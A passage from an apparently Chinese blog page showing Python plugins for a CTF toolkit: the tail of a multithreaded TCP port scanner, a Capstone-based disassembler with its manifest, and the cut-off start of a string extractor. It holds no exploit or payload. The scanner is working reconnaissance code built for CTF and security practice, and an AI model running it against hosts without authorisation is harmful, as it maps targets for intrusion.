<span class="string">&quot;error&quot;</span>: <span class="built_in">str</span>(e)</span><br><span class="line">            &#125;)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            <span class="variable language_">self</span>.running = <span class="literal">False</span></span><br><span class="line">            </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">scan_port</span>(<span class="params">self, target, port, timeout</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;扫描单个端口&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.running:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">                s.settimeout(timeout)</span><br><span class="line">                result = s.connect_ex((target, port))</span><br><span class="line">                <span class="keyword">return</span> result == <span class="number">0</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_service_name</span>(<span class="params">self, port</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;获取端口常见服务名称&quot;&quot;&quot;</span></span><br><span class="line">        common_services = &#123;</span><br><span class="line">            <span class="number">21</span>: <span class="string">&quot;FTP&quot;</span>,</span><br><span class="line">            <span class="number">22</span>: <span class="string">&quot;SSH&quot;</span>,</span><br><span class="line">            <span class="number">23</span>: <span class="string">&quot;Telnet&quot;</span>,</span><br><span class="line">            <span class="number">25</span>: <span class="string">&quot;SMTP&quot;</span>,</span><br><span class="line">            <span class="number">53</span>: <span class="string">&quot;DNS&quot;</span>,</span><br><span class="line">            <span class="number">80</span>: <span class="string">&quot;HTTP&quot;</span>,</span><br><span class="line">            <span class="number">110</span>: <span class="string">&quot;POP3&quot;</span>,</span><br><span class="line">            <span class="number">135</span>: <span class="string">&quot;MSRPC&quot;</span>,</span><br><span class="line">            <span class="number">139</span>: <span class="string">&quot;NetBIOS&quot;</span>,</span><br><span class="line">            <span class="number">143</span>: <span class="string">&quot;IMAP&quot;</span>,</span><br><span class="line">            <span class="number">443</span>: <span class="string">&quot;HTTPS&quot;</span>,</span><br><span class="line">            <span class="number">445</span>: <span class="string">&quot;SMB&quot;</span>,</span><br><span class="line">            <span class="number">3306</span>: <span class="string">&quot;MySQL&quot;</span>,</span><br><span class="line">            <span class="number">3389</span>: <span class="string">&quot;RDP&quot;</span>,</span><br><span class="line">            <span class="number">5900</span>: <span class="string">&quot;VNC&quot;</span>,</span><br><span class="line">            <span class="number">8080</span>: <span class="string">&quot;HTTP-Proxy&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> common_services.get(port, <span class="string">&quot;Unknown&quot;</span>)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GetUI</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;返回UI定义&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&quot;type&quot;</span>: <span class="string">&quot;panel&quot;</span>,</span><br><span class="line">            <span class="string">&quot;title&quot;</span>: <span class="string">&quot;端口扫描器&quot;</span>,</span><br><span class="line">            <span class="string">&quot;controls&quot;</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;textbox&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;target&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;label&quot;</span>: <span class="string">&quot;目标IP&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;default&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;radio&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;scan_type&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;label&quot;</span>: <span class="string">&quot;扫描类型&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;options&quot;</span>: [</span><br><span class="line">                        &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;common&quot;</span>, <span class="string">&quot;label&quot;</span>: <span class="string">&quot;常见端口&quot;</span>, <span class="string">&quot;selected&quot;</span>: <span class="literal">True</span>&#125;,</span><br><span class="line">                        &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;full&quot;</span>, <span class="string">&quot;label&quot;</span>: <span class="string">&quot;全端口(1-1000)&quot;</span>&#125;</span><br><span class="line">                    ]</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;number&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;timeout&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;label&quot;</span>: <span class="string">&quot;超时时间(秒)&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;default&quot;</span>: <span class="number">1</span>,</span><br><span class="line">                    <span class="string">&quot;min&quot;</span>: <span class="number">0.1</span>,</span><br><span class="line">                    <span class="string">&quot;max&quot;</span>: <span class="number">10</span>,</span><br><span class="line">                    <span class="string">&quot;step&quot;</span>: <span class="number">0.1</span></span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;number&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;threads&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;label&quot;</span>: <span class="string">&quot;线程数&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;default&quot;</span>: <span class="number">50</span>,</span><br><span class="line">                    <span class="string">&quot;min&quot;</span>: <span class="number">10</span>,</span><br><span class="line">                    <span class="string">&quot;max&quot;</span>: <span class="number">200</span>,</span><br><span class="line">                    <span class="string">&quot;step&quot;</span>: <span class="number">10</span></span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;button&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;start_scan&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;label&quot;</span>: <span class="string">&quot;开始扫描&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;button&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;stop_scan&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;label&quot;</span>: <span class="string">&quot;停止扫描&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;disabled&quot;</span>: true</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;progress&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;scan_progress&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;label&quot;</span>: <span class="string">&quot;扫描进度&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;table&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;results_table&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;label&quot;</span>: <span class="string">&quot;扫描结果&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;columns&quot;</span>: [</span><br><span class="line">                        &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;port&quot;</span>, <span class="string">&quot;label&quot;</span>: <span class="string">&quot;端口&quot;</span>&#125;,</span><br><span class="line">                        &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;status&quot;</span>, <span class="string">&quot;label&quot;</span>: <span class="string">&quot;状态&quot;</span>&#125;,</span><br><span class="line">                        &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;service&quot;</span>, <span class="string">&quot;label&quot;</span>: <span class="string">&quot;服务&quot;</span>&#125;</span><br><span class="line">                    ]</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Dispose</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;停止扫描并清理资源&quot;&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.running = <span class="literal">False</span></span><br><span class="line">        <span class="variable language_">self</span>.initialized = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><h3 id="3-逆向工程插件：反汇编查看器-Plugins-DisassemblerTool-main-py"><a href="#3-逆向工程插件：反汇编查看器-Plugins-DisassemblerTool-main-py" class="headerlink" title="3. 逆向工程插件：反汇编查看器 (Plugins/DisassemblerTool/main.py)"></a>3. 逆向工程插件：反汇编查看器 (Plugins/DisassemblerTool/main.py)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> capstone</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Plugin</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = <span class="string">&quot;Disassembler Tool&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.description = <span class="string">&quot;Binary file disassembler using Capstone engine&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.version = <span class="string">&quot;1.0.0&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.author = <span class="string">&quot;CTF Tool Team&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.arch = <span class="string">&quot;x86&quot;</span>  <span class="comment"># 默认架构</span></span><br><span class="line">        <span class="variable language_">self</span>.mode = <span class="string">&quot;32&quot;</span>   <span class="comment"># 默认模式</span></span><br><span class="line">        <span class="variable language_">self</span>.md = <span class="literal">None</span>     <span class="comment"># Capstone引擎实例</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Init</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化插件，创建Capstone引擎实例&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 根据架构和模式初始化Capstone</span></span><br><span class="line">            arch_map = &#123;</span><br><span class="line">                <span class="string">&quot;x86&quot;</span>: capstone.CS_ARCH_X86,</span><br><span class="line">                <span class="string">&quot;arm&quot;</span>: capstone.CS_ARCH_ARM,</span><br><span class="line">                <span class="string">&quot;arm64&quot;</span>: capstone.CS_ARCH_ARM64,</span><br><span class="line">                <span class="string">&quot;mips&quot;</span>: capstone.CS_ARCH_MIPS</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            mode_map = &#123;</span><br><span class="line">                <span class="string">&quot;16&quot;</span>: capstone.CS_MODE_16,</span><br><span class="line">                <span class="string">&quot;32&quot;</span>: capstone.CS_MODE_32,</span><br><span class="line">                <span class="string">&quot;64&quot;</span>: capstone.CS_MODE_64,</span><br><span class="line">                <span class="string">&quot;arm&quot;</span>: capstone.CS_MODE_ARM</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="variable language_">self</span>.md = capstone.Cs(arch_map[<span class="variable language_">self</span>.arch], mode_map[<span class="variable language_">self</span>.mode])</span><br><span class="line">            <span class="variable language_">self</span>.md.detail = <span class="literal">True</span>  <span class="comment"># 启用详细反汇编信息</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Failed to initialize Capstone engine: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">SetArchitecture</span>(<span class="params">self, arch, mode</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;设置反汇编架构和模式&quot;&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.arch = arch</span><br><span class="line">        <span class="variable language_">self</span>.mode = mode</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.Init()  <span class="comment"># 重新初始化引擎</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Disassemble</span>(<span class="params">self, data, address=<span class="number">0x0</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行反汇编&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.md:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.Init():</span><br><span class="line">                <span class="keyword">return</span> []</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 转换输入数据为字节流</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">str</span>):</span><br><span class="line">                <span class="comment"># 尝试从十六进制字符串解析</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">all</span>(c <span class="keyword">in</span> <span class="string">&quot;0123456789abcdefABCDEF &quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> data):</span><br><span class="line">                    data = binascii.unhexlify(data.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    data = data.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                    </span><br><span class="line">            <span class="comment"># 执行反汇编</span></span><br><span class="line">            instructions = []</span><br><span class="line">            <span class="keyword">for</span> insn <span class="keyword">in</span> <span class="variable language_">self</span>.md.disasm(data, address):</span><br><span class="line">                instructions.append(&#123;</span><br><span class="line">                    <span class="string">&quot;address&quot;</span>: <span class="built_in">hex</span>(insn.address),</span><br><span class="line">                    <span class="string">&quot;mnemonic&quot;</span>: insn.mnemonic,</span><br><span class="line">                    <span class="string">&quot;op_str&quot;</span>: insn.op_str,</span><br><span class="line">                    <span class="string">&quot;bytes&quot;</span>: <span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;<span class="subst">&#123;b:02x&#125;</span>&quot;</span> <span class="keyword">for</span> b <span class="keyword">in</span> insn.<span class="built_in">bytes</span>)</span><br><span class="line">                &#125;)</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">return</span> instructions</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Disassembler error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> [&#123;<span class="string">&quot;error&quot;</span>: <span class="built_in">str</span>(e)&#125;]</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Run</span>(<span class="params">self, context_json</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行插件逻辑&quot;&quot;&quot;</span></span><br><span class="line">        context = json.loads(context_json)</span><br><span class="line">        input_data = context.get(<span class="string">&quot;InputText&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        address = <span class="built_in">int</span>(context.get(<span class="string">&quot;Address&quot;</span>, <span class="string">&quot;0x0&quot;</span>), <span class="number">16</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 处理架构和模式参数</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Arch&quot;</span> <span class="keyword">in</span> context:</span><br><span class="line">            arch = context[<span class="string">&quot;Arch&quot;</span>]</span><br><span class="line">            mode = context.get(<span class="string">&quot;Mode&quot;</span>, <span class="string">&quot;32&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.SetArchitecture(arch, mode)</span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 执行反汇编</span></span><br><span class="line">        instructions = <span class="variable language_">self</span>.Disassemble(input_data, address)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&quot;architecture&quot;</span>: <span class="variable language_">self</span>.arch,</span><br><span class="line">            <span class="string">&quot;mode&quot;</span>: <span class="variable language_">self</span>.mode,</span><br><span class="line">            <span class="string">&quot;start_address&quot;</span>: <span class="built_in">hex</span>(address),</span><br><span class="line">            <span class="string">&quot;instruction_count&quot;</span>: <span class="built_in">len</span>(instructions),</span><br><span class="line">            <span class="string">&quot;instructions&quot;</span>: instructions</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GetUI</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;生成插件UI界面&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;div style=&quot;padding: 15px;&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h3&gt;Disassembler Tool&lt;/h3&gt;</span></span><br><span class="line"><span class="string">            &lt;p&gt;Disassemble binary code using Capstone engine.&lt;/p&gt;</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            &lt;div style=&quot;margin-bottom: 15px;&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;label for=&quot;arch-select&quot; style=&quot;display: inline-block; width: 80px;&quot;&gt;Architecture:&lt;/label&gt;</span></span><br><span class="line"><span class="string">                &lt;select id=&quot;arch-select&quot; style=&quot;width: 120px;&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;option value=&quot;x86&quot;&gt;x86&lt;/option&gt;</span></span><br><span class="line"><span class="string">                    &lt;option value=&quot;arm&quot;&gt;ARM&lt;/option&gt;</span></span><br><span class="line"><span class="string">                    &lt;option value=&quot;arm64&quot;&gt;ARM64&lt;/option&gt;</span></span><br><span class="line"><span class="string">                    &lt;option value=&quot;mips&quot;&gt;MIPS&lt;/option&gt;</span></span><br><span class="line"><span class="string">                &lt;/select&gt;</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">                &lt;label for=&quot;mode-select&quot; style=&quot;display: inline-block; width: 60px; margin-left: 15px;&quot;&gt;Mode:&lt;/label&gt;</span></span><br><span class="line"><span class="string">                &lt;select id=&quot;mode-select&quot; style=&quot;width: 80px;&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;option value=&quot;16&quot;&gt;16-bit&lt;/option&gt;</span></span><br><span class="line"><span class="string">                    &lt;option value=&quot;32&quot; selected&gt;32-bit&lt;/option&gt;</span></span><br><span class="line"><span class="string">                    &lt;option value=&quot;64&quot;&gt;64-bit&lt;/option&gt;</span></span><br><span class="line"><span class="string">                    &lt;option value=&quot;arm&quot;&gt;ARM&lt;/option&gt;</span></span><br><span class="line"><span class="string">                &lt;/select&gt;</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">                &lt;label for=&quot;address-input&quot; style=&quot;display: inline-block; width: 80px; margin-left: 15px;&quot;&gt;Start Address:&lt;/label&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;text&quot; id=&quot;address-input&quot; value=&quot;0x00000000&quot; style=&quot;width: 100px;&quot;/&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            &lt;div style=&quot;background-color: #f0f0f0; padding: 10px; border-radius: 5px; margin-top: 10px; font-family: monospace; font-size: 12px;&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;strong&gt;Usage:&lt;/strong&gt;</span></span><br><span class="line"><span class="string">                &lt;ul&gt;</span></span><br><span class="line"><span class="string">                    &lt;li&gt;Enter hex-encoded binary data or raw text in the main input box&lt;/li&gt;</span></span><br><span class="line"><span class="string">                    &lt;li&gt;Select target architecture and mode&lt;/li&gt;</span></span><br><span class="line"><span class="string">                    &lt;li&gt;Specify start address (hex format, e.g. 0x08048000)&lt;/li&gt;</span></span><br><span class="line"><span class="string">                    &lt;li&gt;Click &quot;Execute&quot; to disassemble&lt;/li&gt;</span></span><br><span class="line"><span class="string">                &lt;/ul&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;&lt;strong&gt;Example:&lt;/strong&gt; 5589e58b45088b005dc3 (x86 32-bit)&lt;/p&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Dispose</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;清理资源&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.md:</span><br><span class="line">            <span class="variable language_">self</span>.md.close()</span><br><span class="line">        <span class="variable language_">self</span>.md = <span class="literal">None</span></span><br></pre></td></tr></table></figure><h4 id="反汇编工具插件清单-Plugins-DisassemblerTool-manifest-json"><a href="#反汇编工具插件清单-Plugins-DisassemblerTool-manifest-json" class="headerlink" title="反汇编工具插件清单 (Plugins/DisassemblerTool/manifest.json)"></a>反汇编工具插件清单 (Plugins/DisassemblerTool/manifest.json)</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;DisassemblerTool&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Binary file disassembler using Capstone engine&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Author&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CTF Tool Team&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;EntryPoint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;main.py&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Dependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;capstone==5.0.1&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="4-逆向工程插件：字符串提取工具-Plugins-StringExtractorTool-main-py"><a href="#4-逆向工程插件：字符串提取工具-Plugins-StringExtractorTool-main-py" class="headerlink" title="4. 逆向工程插件：字符串提取工具 (Plugins/StringExtractorTool/main.py)"></a>4. 逆向工程插件：字符串提取工具 (Plugins/StringExtractorTool/main.py)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> 